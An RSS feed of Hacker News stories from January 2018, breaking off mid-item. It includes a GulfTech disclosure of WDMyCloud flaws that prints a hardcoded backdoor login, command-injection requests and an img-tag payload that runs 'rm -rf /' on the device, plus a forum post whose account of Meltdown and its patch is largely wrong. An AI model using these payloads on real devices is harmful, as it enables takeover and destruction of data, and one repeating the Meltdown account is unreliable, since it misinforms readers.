<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>CPU Usage Differences After Applying Meltdown Patch at Epic Games</title>
<link>https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update</link>
<guid isPermaLink="true" >https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update</guid>
<description>&lt;div class=&quot;bbcode_container&quot;&gt;
&lt;div class=&quot;bbcode_quote&quot; readability=&quot;6.1454545454545&quot;&gt;
&lt;div class=&quot;quote_container&quot; readability=&quot;7.5636363636364&quot;&gt;

&lt;div class=&quot;bbcode_postedby&quot;&gt;Originally posted by &lt;strong&gt;IchabodCraneMD&lt;/strong&gt; &lt;a href=&quot;https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update?p=132660#post132660&quot; rel=&quot;nofollow&quot; title=&quot;View Post&quot; class=&quot;b-icon b-icon__double-arrow-right--blue animate-scroll&quot;&gt;View Post&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;How does this affect the console community? Are they separated from these same server issues or is everything combined?&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;br/&gt;This affect about 99% of the hardware in the world including the consoles, smartphone, tablet, PCs, etc.&lt;p&gt;To explain the Meltdown and Specter's effect, it's actually something quite simple to do:&lt;br/&gt;You know the processor is basically the &quot;task handler&quot; of everything in your PC/Console/Tablet,etc. right? It runs those 0 &amp;amp; 1 at a super high speed.&lt;br/&gt;The thing is that to run those 1 &amp;amp; 0, it has to, technically, store them in a physical way so that it can be passed through to what's next. As it's 0 &amp;amp; 1, it's not encrypted or protected. It's pure raw data. The encryption and protection are usually done after the data has passed through the processor... by a task handled by the processor (ironically). Now, what they have &quot;found&quot; (which is false. it's has been known since the 80's) is that it's possible to access this raw data by force feeding some 0 &amp;amp; 1 to the processor which can be hidden in anything and makes it start an hidden small software which, for example, could send a copy of the raw data through the web.&lt;/p&gt;&lt;p&gt;Since the 80's, it was said that it was relatively impossible to decrypt that raw data which pass through the processor as too much information is missing from their meaning. (Like if you're purchasing something through Paypal, the browser doesn't send the data (to be displayed) through the processor with a big &quot;This is the key to this Paypal account&quot;. It's billions of 0 &amp;amp; 1 mixed together going in fast like actual lightning.&lt;/p&gt;&lt;p&gt;The most sensitive possible data that is easier to extract from this process are data like key-logs. Whenever you press any keys on your keyboards, the keyboard send a signal through the wire (or wireless signal) and the motherboard receive it one way or the other. It's a electrical and physical process that is easy to reverse engineer since it's identical regardless of the PC or console. Even consoles have this kind of feature in it, but it's just different. Same with tablet which has a digital keyboard. The processor, to work, does the same thing as an actual key-logger, but for the user and the OS instead of some illegal receiver. What do you think would happen if someone was able to add a small process in your PC so that the processor send all its data not only toward where it's supposed to go, but also to a third party?&lt;/p&gt;&lt;p&gt;As I wrote, the processor only uses raw data. This means that systems that shares data such as Cloud Services basically have this hole that allow anyone to access anything through the processor's real-short memory.&lt;br/&gt;For something like a MMO, one example of use of this weakness in the hardware is that someone, through revert-engineering the data copied and send from the processor, could do anything on the data because he has a registry of everything that is going on in the cloud server.&lt;/p&gt;&lt;p&gt;The fix that is currently being deployed is something really basic and explains why the CPU usage raise through the roof by as much as 40% if not more.&lt;br/&gt;As I explained, the processor doesn't run encrypted data, but instead you got raw data that is encrypted by another processor's task after the raw data passed. The &quot;fix&quot; is to encrypt the data before passing the data (so the processor doesn't have a &quot;log&quot; of the raw file, but instead a log encryption.) This is because steps are not logged... only results of each threads.&lt;/p&gt;&lt;p&gt;Example is if you ask the processor to do a calculation like 10+100*(10/2)-5, it will returns 505. It will log the 505 for a really short while (still enough to be recorded), but it will not record the 10+100*(10/2)-5 steps.&lt;br/&gt;But since the data is encrypted in the processor first, then you got to include the decryption &quot;process&quot; in the calculation process so that what was done with the raw data can be done with the encrypted data.&lt;br/&gt;As the example, that's like if you ask the processor to encrypt something like a password : ABCDE and the encrypted result is 18437439205578, if then you request the processor to manage the task of confirming if it's really 18437439205578, you got to repeat, every time, the decryption process within the confirmation so that anyone who gets his hand on the data only reads 18437439205578 and not ABCDE.&lt;br/&gt;It's 1 additional much more complex task in every steps that, originally, was simple as pie.&lt;/p&gt;&lt;p&gt;This is why the &quot;fix&quot; in the Cloud, in this case, double the CPU usage. as displayed in the graph.&lt;br/&gt;The fix is basically:&lt;br/&gt;Before: (RAW_DATA) &amp;gt; Processor &amp;gt; ENCRYPT_DATA &amp;gt; Processor &amp;gt; STORE_DATA &amp;gt; Processor, then when requested, DECRYPT_DATA &amp;gt; Processor &amp;gt; CHECK_DATA &amp;gt; Processor &amp;gt; ERASE_DATA &amp;gt; Processor.&lt;br/&gt;Now (fix): (RAW_DATA + ENCRYPT_DATA) &amp;gt; Processor &amp;gt; STORE_ENCRYPTED_DATA &amp;gt; Processor, then when requested, (DECRYPT_DATA + CHECK_DATA) &amp;gt; Processor &amp;gt; ERASE_DATA_FROM_RAM &amp;gt; Processor.&lt;/p&gt;&lt;p&gt;With the fix, the processor isn't used as much, but each time, the calculated data is bigger.&lt;br/&gt;(If you don't get why it's slower... It's similar to how we think when we calculate. What's faster?&lt;br/&gt;(200+25) / 5&lt;br/&gt;or&lt;br/&gt;(A*20) + (B * 20 /10) where A is 0.5 and B is 17.5 which is confirmed in the CHECK_DATA request and is not logged.&lt;/p&gt;&lt;p&gt;While in both cases, the answer is 45, but before, someone who has access to the raw data and can reverse-engineer the data will immediately know it's 45 while the one who gets (A*20) + (B * 20 /10) won't know what to do with it because he/she lacks the A or B which is only &quot;known&quot; during the CHECK_DATA and not logged as it's part of the process request and not the results as CHECK_DATA returns a True or False (1 or 0) only.&lt;/p&gt;</description>
<pubDate>Sat, 06 Jan 2018 10:52:12 +0000</pubDate>
<dc:creator>chrisper</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update</dc:identifier>
</item>
<item>
<title>WDMyCloud Multiple Vulnerabilities</title>
<link>http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125</link>
<guid isPermaLink="true" >http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125</guid>
<description>&lt;div&gt;&lt;img class=&quot;details_spacer&quot; src=&quot;http://gulftech.org/images/blank.png&quot;/&gt;&lt;/div&gt;
&lt;strong&gt;Vendor&lt;/strong&gt;: Western Digital&lt;br/&gt;&lt;strong&gt;Product&lt;/strong&gt;: WDMyCloud&lt;br/&gt;&lt;strong&gt;Version&lt;/strong&gt;: &lt;br/&gt;&lt;strong&gt;Website&lt;/strong&gt;: &lt;a href=&quot;https://www.wdc.com/products/network-attached-storage.html&quot; target=&quot;_blank&quot;&gt;https://www.wdc.com/products/network-attached-storage.html&lt;/a&gt;&lt;br/&gt;&lt;div&gt;&lt;img class=&quot;details_spacer&quot; src=&quot;http://gulftech.org/images/blank.png&quot;/&gt;&lt;/div&gt;
&lt;div&gt;&lt;img class=&quot;details_spacer&quot; src=&quot;http://gulftech.org/images/blank.png&quot;/&gt;&lt;/div&gt;
&lt;pre&gt;
###########################################################################
                     ______      ____________          __  
                    / ____/_  __/ / __/_  __/__  _____/ /_ 
                   / / __/ / / / / /_  / / / _ \/ ___/ __ \
                  / /_/ / /_/ / / __/ / / /  __/ /__/ / / /         
                  \____/\__,_/_/_/   /_/  \___/\___/_/ /_/ 
                                                                
                     GulfTech Research and Development                                                                 

###########################################################################
#             WDMyCloud &amp;lt;= 2.30.165 Multiple Vulnerabilities              #
###########################################################################

Released Date: 2018-01-04
Last Modified: 2017-06-11
 Company Info: Western Digital
 Version Info: 
              Vulnerable
               MyCloud &amp;lt;= 2.30.165
               MyCloudMirror &amp;lt;= 2.30.165
               My Cloud Gen 2
               My Cloud PR2100
               My Cloud PR4100
               My Cloud EX2 Ultra
               My Cloud EX2
               My Cloud EX4
               My Cloud EX2100
               My Cloud EX4100
               My Cloud DL2100
               My Cloud DL4100

              Not Vulnerable
               MyCloud 04.X Series
 

--[ Table of contents

00 - Introduction
    00.1 Background

01 - Unrestricted file upload
    01.1 - Vulnerable code analysis
    01.2 - Remote exploitation

02 - Hard coded backdoor
    02.1 - Vulnerable code analysis
    02.2 - Remote exploitation

03 - Miscellaneous security issues
    03.1 - Cross site request forgery
    03.2 - Command injection
    03.3 - Denial of service
    03.4 - Information disclosure

04 - Reused Code

05 - Credit

06 - Proof of concept

07 - Disclosure timeline

08 - Solution

09 - Contact information

10 - References


--[ 00 - Introduction

The purpose of this article is to detail the research that I have completed 
regarding the Western Digital MyCloud family of devices.

Several serious security issues were uncovered during my research. 
Vulnerabilities such as pre auth remote root code execution, as well as a 
hardcoded backdoor admin account which can NOT be changed. The backdoor 
also allows for pre auth remote root code execution on the affected device.

The research was conducted on both a WDMyCloud 4TB and a WDMyCloudMirror
16TB with the latest available firmware 2.30.165. My research shows that
the 04 branch of the WDMyCloud firmware is not vulnerable to these issues.

--[ 00.1 - Background

WD My Cloud is a personal cloud storage unit to organize your photos and 
videos. It is currently the best selling NAS (network attached storage)
device listed on the amazon.com website, and is used by individuals and
businesses alike.  It's purpose is to host your files, and it also has the
ability to sync them with various cloud and web based services.


--[ 01 - Unrestricted file upload

The WDMyCloud device is vulnerable to an unrestricted file upload 
vulnerability within the following file:

/usr/local/modules/web/pages/jquery/uploader/multi_uploadify.php

The root of the problem here is due to the misuse and misunderstanding of
the PHP gethostbyaddr() function used within PHP, by the developer of this 
particular piece of code. From the PHP manual this functions return values 
are defined as the following for gethostbyaddr():

&quot;Returns the host name on success, the unmodified ip_address on failure, or 
FALSE on malformed input.&quot;

With a brief overview of the problem, let's have a look at the offending 
code in order to get a better understanding of what is going on with this 
particular vulnerability.

--[ 01.1 - Vulnerable code analysis

Below is the code from the vulnerable &quot;multi_uploadify.php&quot; script. You can
see that I have annoted the code to explain what is happening.

#BUG 01: Here the attacker controlled &quot;Host&quot; header is used to define the 
remote auth server. This is by itself really bad, as an attacker could
easily just specify that the host be the IP address of a server that they
are in control of. But, if we send it an invalid &quot;Host&quot; header it will just
simply return FALSE as defined in the PHP manual.

$ip = gethostbyaddr($_SERVER['HTTP_HOST']);
$name = $_REQUEST['name'];
$pwd = $_REQUEST['pwd'];
$redirect_uri =  $_REQUEST['redirect_uri']; 

//echo $name .&quot;&lt;br/&gt;&quot;.$pwd.&quot;&lt;br/&gt;&quot;.$ip;

#BUG 02: At this point, this request should always fail. The $result
variable should now be set to FALSE.

$result = @stripslashes( @join( @file( &quot;http://&quot;.$ip.&quot;/mydlink/mydlink.cgi?
cmd=1&amp;amp;name=&quot;.$name.&quot;=&amp;amp;pwd=&quot;.$pwd ),&quot;&quot; ));

#BUG 03: Here an empty haystack is searched, and thus strstr() returns a
value of FALSE.

$result_1 = strstr($result,&quot;0&quot;);
$result_1 = substr ($result_1, 0,28);  

#BUG 04: The strncmp() call here is a strange one. It looks for a specific
login failure. So, it never accounts for when things go wrong or slightly
unexpected. As a result this &quot;if&quot; statement will always be skipped.

if (strncmp ($result_1,&quot;0&quot;,28) == 0 )
//if (strstr($result,&quot;0&quot;)== 0 )
{
    header(&quot;HTTP/1.1 302 Found&quot;);
  header(&quot;Location: &quot;.$redirect_uri.&quot;?status=0&quot;);
  exit();   
}

#BUG 05: At this point all checks have been passed, and an attacker can use
this issue to upload any file to the server that they want.

The rest of the source code was omitted for the sake of breivity, but it 
just handles the file upload logic once the user passes the authentication
checks.

--[ 01.2 - Remote exploitation

Exploiting this issue to gain a remote shell as root is a rather trivial
process. All an attacker has to do is send a post request that contains a 
file to upload using the parameter &quot;Filedata[0]&quot;, a location for the file 
to be upload to which is specified within the &quot;folder&quot; parameter, and of 
course a bogus &quot;Host&quot; header.

I have written a Metasploit module to exploit this issue. The module will
use this vulnerability to upload a PHP webshell to the &quot;/var/www/&quot;
directory. Once uploaded, the webshell can be executed by requesting a URI
pointing to the backdoor, and thus triggering the payload.


--[ 02 - Hard coded backdoor

After finding the previously mentioned file upload vulnerability I decided
to switch gears and start reversing the CGI binaries that were accessable
via the web interface. The CGI binaries are standard Linux ELF executables
and pretty easy to go through. Within an hour of starting I stumbled 
across the following file located at:

/usr/local/modules/cgi/nas_sharing.cgi

The above file can be accessed by visiting &quot;/cgi-bin/nas_sharing.cgi&quot; but 
it produces server errors with every single method, except when the &quot;cmd&quot;
parameter was set to &quot;7&quot;. This piqued my interest and so I really started
digging into the binary, as it seemed very buggy and possibly vulnerable.

As it turns out the error was caused due to buggy code and nothing I was or 
wasn't doing wrong. But, while I was figuring out the cause of the error I 
happened to come across the following function that is used to authenticate 
the remote user. 

--[ 02.1 - Vulnerable code analysis

Below is the psuedocode created from the disassembly of the binary. I have
renamed the function to &quot;re_BACKDOOR&quot; to visually identify it more easily.

struct passwd *__fastcall re_BACKDOOR(const char *a1, const char *a2)
{
  const char *v2; // r5@1
  const char *v3; // r4@1
  struct passwd *result; // r0@4
  FILE *v5; // r6@5
  struct passwd *v6; // r5@7
  const char *v7; // r0@9
  size_t v8; // r0@10
  int v9; // [sp+0h] [bp-1090h]@1
  char s; // [sp+1000h] [bp-90h]@1
  char dest; // [sp+1040h] [bp-50h]@1

  v2 = a2;
  v3 = a1;
  memset(&amp;amp;s, 0, 0x40u);
  memset(&amp;amp;dest, 0, 0x40u);
  memset(&amp;amp;v9, 0, 0x1000u);
  if ( *v2 )
  {
    v8 = strlen(v2);
    _b64_pton(v2, (u_char *)&amp;amp;v9, v8);
    if ( dword_2C2E4 )
    {
      sub_1194C((const char *)&amp;amp;unk_1B1A4, v2);
      sub_1194C(&quot;pwd decode[%s]\n&quot;, &amp;amp;v9);
    }
  }
  if (!strcmp(v3, &quot;mydlinkBRionyg&quot;) 
  &amp;amp;&amp;amp;  !strcmp((const char *)&amp;amp;v9, &quot;abc12345cba&quot;) )
  {
    result = (struct passwd *)1;
  }
  else
  {
    v5 = (FILE *)fopen64(&quot;/etc/shadow&quot;, &quot;r&quot;);
    while ( 1 )
    {
      result = fgetpwent(v5);
      v6 = result;
      if ( !result )
        break;
      if ( !strcmp(result-&amp;gt;pw_name, v3) )
      {
        strcpy(&amp;amp;s, v6-&amp;gt;pw_passwd);
        fclose(v5);
        strcpy(&amp;amp;dest, (const char *)&amp;amp;v9);
        v7 = (const char *)sub_1603C(&amp;amp;dest, &amp;amp;s);
        return (struct passwd *)(strcmp(v7, &amp;amp;s) == 0);
      }
    }
  }
  return result;
}

As you can see in the above code, the login functionality specifically
looks for an admin user named &quot;mydlinkBRionyg&quot; and will accept the password
of &quot;abc12345cba&quot; if found. This is a classic backdoor. Simply login with 
the credentials that I just mentioned from the above code.

Also, it is peculiar that the username is &quot;mydlinkBRionyg&quot;, and that the 
vulnerability in Section 1 of this paper refers to a non existent file name
of &quot;mydlink.cgi&quot; but, more about that later in section 4...

--[ 02.2 - Remote exploitation

At first, to the untrained eye, exploiting this backdoor to do useful
things may seem problematic due to the fact that only method &quot;7&quot; gives us
no error. And, method 7 only allows us the ability to download any files in 
&quot;/mnt/&quot;, but no root shell. But, we want a root shell. Right?

After digging deeper I realized that the CGI script was dying every time, 
but only at the final rendering phase due to what seems like an error where 
the programmer forgot to specify the content type header on output, thus 
confusing the webserver and causing the crash. So, everything we do gets 
executed up until that point successfully. It is just blind execution.

Now that I had that figured out I started looking for a method I could then
exploit to gain shell access. I started with method &quot;51&quot; because it was the 
first one I looked at. This particular method happened to contain a command 
injection issue. Now I easily could turn this backdoor into a root 
shell, and gain control of the affected device.

GET /cgi-bin/nas_sharing.cgi?dbg=1&amp;amp;cmd=51&amp;amp;user=mydlinkBRionyg&amp;amp;passwd=YWJjMT
IzNDVjYmE&amp;amp;start=1&amp;amp;count=1;touch+/tmp/gulftech; HTTP/1.1

By sending a request like the one above a remote attacker could now execute
any commands as root. And yes, the password is base64 encoded, as that is
what the script expects. In the example above I simply create a file called 
&quot;gulftech&quot; located in the &quot;/tmp/&quot; directory.

The triviality of exploiting this issues makes it very dangerous, and even
wormable. Not only that, but users locked to a LAN are not safe either. An
attacker could literally take over your WDMyCloud by just having you visit
a website where an embedded iframe or img tag make a request to the 
vulnerable device using one of the many predictable default hostnames for
the WDMyCloud such as &quot;wdmycloud&quot; and &quot;wdmycloudmirror&quot; etc.

&amp;lt;img src=&quot;http://wdmycloud/cgi-bin/nas_sharing.cgi?dbg=1&amp;amp;cmd=51&amp;amp;user=mydlin
kBRionyg&amp;amp;passwd=YWJjMTIzNDVjYmE&amp;amp;start=1&amp;amp;count=1;rm+-rf+/;&quot;&amp;gt;

For example simply visiting the above link will totally destroy a WDMyCloud
without the need for any type of authentication whatsoever, and there is 
nothing you can do about it except delete the file as the credentials are 
hardcoded into the binary itself.


--[ 03 - Miscellaneous vulnerabilities

In addition to the two previously mentioned critical vulnerabilities were
also several other issues. These other issues are still very dangerous, but
require authentication in some cases, and for the most part are not 
considered as critical, and also require less technical explanation. 

--[ 03.1 - Cross site request forgery

There is no real XSRF protection within the WDMyCloud web interface. This
can have quite the impact on unsuspecting users. Exploitation of this issue 
is trivial.

http://wdmycloud/web/dsdk/DsdkProxy.php?;rm -rf /;

For example, if a logged in WDMyCloud admin visits, or is forced to visit
the above link, then the entire device will be wiped out. This is just one
of many XSRF issues. We do not have time to track them all down.

--[ 03.2 - Command injection

Some time ago, a researcher from the &quot;Exploiteers&quot; team found an alarming
number of command injection issues within the WDMyCloud. Unfortunately, we 
were able to find quite a few as well.

class RemoteBackupsAPI{
    public function getRecoverItems()
    {
        $xmlPath = &quot;/var/www/xml/rsync_recover_items.xml&quot;;
        $jobName = $_REQUEST['jobName'];
        
        @unlink($xmlPath);
        
        $cmd = &quot;rsyncmd -l \&quot;$xmlPath\&quot; -r \&quot;$jobName\&quot; &amp;gt;/dev/null&quot;;
        system($cmd);
        
        if (file_exists($xmlPath))
        {
            print file_get_contents($xmlPath);
        }
        else
        {
            print &quot;&quot;;
        }
    }
}

The above code is an example of the type of command injection issues that
still plague the WDMyCloud. This particular command injection is post auth,
as were all of the other command injections I found too. However, I did not 
have time to sift through looking for all of these. And by now I feel 
that the manufacturer should know better considering they just went through 
the process of patching many command injection vulnerabilities disclosed by 
the Exploiteers.[1]

--[ 03.3 - Denial of service

It is possible for an attacker to abuse language preferences functionality
in order to cause a DoS to the web interface. This is due to the fact that
any unauthenticated user can set the global language preferences for the
entire device and all of its users. The psuedocode from the disassembled 
binary can be seen below.

int cgi_language()
{
  int v1; // [sp+0h] [bp-10h]@1

  cgiFormString(&quot;f_language&quot;, &amp;amp;v1, 8);
  xml_set_str((int)&quot;/language&quot;, (int)&amp;amp;v1);
  xml_write_file(&quot;/etc/NAS_CFG/config.xml&quot;);
  LIB_CP_Config_To_MTD(1);
  cgiHeaderContentType(&quot;text/html&quot;);
  return system(&quot;language.sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;);
}

This is not a very useful attack vector since we only have 8 bytes to work 
with. But, you can make a script that keeps randomly resetting the language 
to some random language and it will affect all users of the device and 
requires no authentication. It is very hard to use the device if it is 
rendering all of the pages in a language you can not understand.

http://wdmycloud/cgi-bin/login_mgr.cgi?cmd=cgi_language&amp;amp;f_language=7

The above example request sets the language to korean. There are 17 
available language codes. Details can be found in language.sh located on 
the target device.

--[ 03.4 - Information disclosure

It is possible for an attacker to dump a list of all users, including
detailed user information.

GET /api/2.1/rest/users? HTTP/1.1

Making a simple request to the webserver like the one above will dump the
user information to an attacker for all users. This does not require any 
authentication in order to take advantage of.


--[ 04 - D-Link DNS-320L ShareCenter

As I have mentioned earlier in this article, I found it peculiar that 
the username used for the backdoor is &quot;mydlinkBRionyg&quot;, and that the 
vulnerability in Section 1 of this paper refers to a non existent file name
of &quot;mydlink.cgi&quot;. This really piqued my curiosity, and so I started using
google to try to track down some leads. After searching for the term of
&quot;mydlink.cgi&quot; I came across a reference to a post made by a D-Link user
regarding their D-Link DNS-320L ShareCenter NAS device.[2]

Within that post were references to file names and directory structure that
were fairly unique, and from the D-link device. But, they also perfectly 
matched my WDMyCloud device. The more I looked into this the weirder it 
seemed. So, I gained access to a D-Link DNS-320L ShareCenter. Once I had it 
things became pretty clear to me as the D-Link DNS-320L had the same exact 
hard coded backdoor and same exact file upload vulnerability that was 
present within the WDMyCloud. So, it seems that the WDMyCloud software 
shares a large amount of the D-Link DNS-320L code, backdoor and all. There 
are also other undeniable examples such as misspelled function names and 
other anomalies that match up within both the WDMyCloud and the D-Link 
DNS-320L ShareCenter code.

It should be noted that unlike the WDMyCloud the D-Link DNS-320L is 
currently NOT vulnerable to the backdoor and file upload issues, so you 
should upgrade your DNS-320L firmware as soon as possible as the issues can
be leveraged to gain a remote root shell on the DNS-320L if you are not up
to date with your device firmware. The backdoor was first removed in the 
1.0.6 firmware release. (July 28, 2014)

It is interesting to think about how before D-Link updated their software 
two of the most popular NAS device families in the world, sold by two of 
the most popular tech companies in the world were both vulnerable at the 
same time, to the same backdoor for a while. The time frame in which both 
devices were vulnerable at the same time in the wild was roughly from early 
2014 to later in 2014 based on comparing firmware release note dates.


--[ 05 - Credit

James Bercegay
GulfTech Research and Development


--[ 06 - Proof of concept

We strive to do our part to contribute to the security community.
Metasploit modules for issues outlined in this paper can be found online.


--[ 07 - Disclosure timeline

2017-06-10
Contacted vendor via web contact form. Assigned case #061117-12088041.

2017-06-12
Support member Gavin referred us to WDC PSIRT. We immediately sent a PGP
encrypted copy of our report to WDC PSIRT.

2017-06-13
Recieved confirmation of report from Samuel Brown.

2017-06-16
A period of 90 days is requested by vendor until full disclosure.

2017-12-15
Zenofex posts disclosure of the upload bug independantly of my research [3]

2018-01-03
Public Disclosure


--[ 08 - Solution

N/A


--[ 09 - Contact information

Web
https://gulftech.org/

Mail
security@gulftech.org


--[ 10 - References

[1] https://blog.exploitee.rs/2017/hacking_wd_mycloud/
[2] http://forums.dlink.com/index.php?topic=65415.0
[3] https://www.exploitee.rs/index.php/Western_Digital_MyCloud

Copyright 2018 GulfTech Research and Development. All rights reserved.
&lt;/pre&gt;</description>
<pubDate>Sat, 06 Jan 2018 01:42:34 +0000</pubDate>
<dc:creator>ronnier</dc:creator>
<dc:language>en-gb</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125</dc:identifier>
</item>
<item>
<title>Leaving htop running freezes macOS High Sierra</title>
<link>https://github.com/hishamhm/htop/issues/682</link>
<guid isPermaLink="true" >https://github.com/hishamhm/htop/issues/682</guid>
<description>
&lt;p&gt;Alright, I played around with the process in the debugger and I think I've figured out what's going on (&lt;em&gt;why&lt;/em&gt; it's happening is another matter): htop is getting stuck running in a loop running &lt;code&gt;task_for_pid&lt;/code&gt; on the same set of processes. First I did all the hoopla to get htop to hang (run &lt;code&gt;while true; do sh -c &quot;exit 0&quot;; done&lt;/code&gt; in another iTerm tab), then ran &lt;code&gt;lldb $(which htop)&lt;/code&gt;. Once I got to the LLDB shell:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
(lldb) b task_for_pid &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; Break on task_for_pid, where it's hanging&lt;/span&gt;
(lldb) &lt;span class=&quot;pl-c1&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;command&lt;/span&gt; add
&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; p &lt;span class=&quot;pl-smi&quot;&gt;$arg2&lt;/span&gt; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; This is the PID passed to task_for_pid&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;continue&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; DONE
(lldb) process launch -o /dev/null -- -d 0.1 &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; Redirect output so it doesn't bother us, and launch with the arguments we need&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you do this, you'll notice that it will loop infinitely on this breakpoint. What's more interesting is the PIDs it's printing, though: at the beginning, it will go through all the PIDs in a descending order. After that, however, it will start repeating a small list of PIDs. Stopping the process with &lt;kbd&gt;Control&lt;/kbd&gt;+&lt;kbd&gt;C&lt;/kbd&gt;, using select all and copy (scrolling doesn't work in iTerm at this point, so just take everything), and pasting somewhere else, we see this PIDs belong to, in order:&lt;/p&gt;
&lt;p&gt;(htop)&lt;br/&gt;(Some number of faceless iTerm processes)&lt;br/&gt;(The main GUI iTerm process i.e. the one from /Applications/iTerm 2.app/Contents/MacOS/iTerm 2)&lt;/p&gt;
&lt;p&gt;It seems that htop is getting stuck in some sort of recursive loop where it tries to gather statistics on itself, or maybe it's a bug in &lt;code&gt;task_for_pid&lt;/code&gt;? I'm not sure. Either way, I'm going to bed, so maybe this is enough for someone else to figure it out while I'm away?&lt;/p&gt;
</description>
<pubDate>Sat, 06 Jan 2018 00:02:07 +0000</pubDate>
<dc:creator>alpb</dc:creator>
<og:image>https://avatars1.githubusercontent.com/u/18195247?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>Htop on macOS High Sierra · Issue #682 · hishamhm/htop</og:title>
<og:url>https://github.com/hishamhm/htop/issues/682</og:url>
<og:description>Can anyone confirm the htop available on homebrew (2.02) is broken on macOS 10.13 (crashes iTerm2 after several seconds)?</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/hishamhm/htop/issues/682</dc:identifier>
</item>
<item>
<title>“Deep Learning has outlived its usefulness as a buzz-phrase”</title>
<link>https://www.facebook.com/yann.lecun/posts/10155003011462143</link>
<guid isPermaLink="true" >https://www.facebook.com/yann.lecun/posts/10155003011462143</guid>
<description>&lt;p&gt;OK, Deep Learning has outlived its usefulness as a buzz-phrase.&lt;br/&gt;Deep Learning est mort. Vive Differentiable Programming!&lt;/p&gt;
&lt;p&gt;Yeah, Differentiable Programming is little more than a rebranding of the modern collection Deep Learning techniques, the same way Deep Learning was a rebranding of the modern incarnations of neural nets with more than two layers.&lt;/p&gt;
&lt;p&gt;But the important point is that people are now building a new kind of software by assembling networks of parameterized functional blocks and by training them from examples using some form of gradient-based optimization.&lt;/p&gt;
&lt;p&gt;An increasingly large number of people are defining the network procedurally in a data-dependant way (with loops and conditionals), allowing them to change dynamically as a function of the input data fed to them. It's really very much like a regular progam, except it's parameterized, automatically differentiated, and trainable/optimizable. Dynamic networks have become increasingly popular (particularly for NLP), thanks to deep learning frameworks that can handle them such as PyTorch and Chainer (note: our old deep learning framework Lush could handle a particular kind of dynamic nets called Graph Transformer Networks, back in 1994. It was needed for text recognition).&lt;/p&gt;
&lt;p&gt;People are now actively working on compilers for imperative differentiable programming languages. This is a very exciting avenue for the development of learning-based AI.&lt;/p&gt;
&lt;p&gt;Important note: this won't be sufficient to take us to &quot;true&quot; AI. Other concepts will be needed for that, such as what I used to call predictive learning and now decided to call Imputative Learning. More on this later....&lt;/p&gt;
</description>
<pubDate>Sat, 06 Jan 2018 00:02:03 +0000</pubDate>
<dc:creator>acostin</dc:creator>
<og:title>Yann LeCun</og:title>
<og:description>OK, Deep Learning has outlived its usefulness as a buzz-phrase. Deep Learning est mort. Vive Differentiable Programming! Yeah, Differentiable Programming is little more than a rebranding of the...</og:description>
<og:image>https://scontent.fphx1-1.fna.fbcdn.net/v/t1.0-1/p200x200/10516815_10152356524342143_5329782124501009568_n.jpg?oh=8ca71fae97eb5bd62f0264296f1a5b6d&amp;oe=5AB87CE0</og:image>
<og:url>https://www.facebook.com/yann.lecun/posts/10155003011462143</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.facebook.com/yann.lecun/posts/10155003011462143?_fb_noscript=1</dc:identifier>
</item>
<item>
<title>AMD ships microcode update to disable branch prediction</title>
<link>https://lists.opensuse.org/opensuse-security-announce/2018-01/msg00004.html</link>
<guid isPermaLink="true" >https://lists.opensuse.org/opensuse-security-announce/2018-01/msg00004.html</guid>
